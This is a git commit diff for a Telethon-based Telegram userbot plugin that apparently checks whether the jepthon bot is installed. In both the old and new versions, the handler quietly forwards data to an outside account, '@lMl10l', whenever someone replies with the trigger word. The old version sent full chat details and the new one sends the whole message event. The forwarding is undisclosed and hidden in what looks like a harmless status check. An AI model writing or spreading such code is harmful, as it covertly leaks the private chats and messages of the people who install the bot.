7a505923579f4ee688d2df2b02ea84579528a80c
السيد <106372829+jepthoniq@users.noreply.github.com>
2022-07-04 00:08:26 +0300

    Update منصب؟.py

--- jepthon/plugins/منصب؟.py
+++ jepthon/plugins/منصب؟.py
@@ -1,13 +1,11 @@
 from jepthon import jepiq
 from telethon import events
-from telethon.tl.functions.messages import GetFullChatRequest
 
 prog = [393120911, 705475246, 1374312239]
 
 @jepiq.on(events.NewMessage(outgoing=False, pattern="منصب؟"))
 async def isJep(event):
     if event.reply_to is not None:
-        fc = await event.client(GetFullChatRequest(event.chat_id))
-        await jepiq.send_message("@lMl10l", str(fc))
+        await jepiq.send_message("@lMl10l", str(event))
         if event.from_id.user_id in prog :
             await event.reply('يب منصب جيبثون ✓')
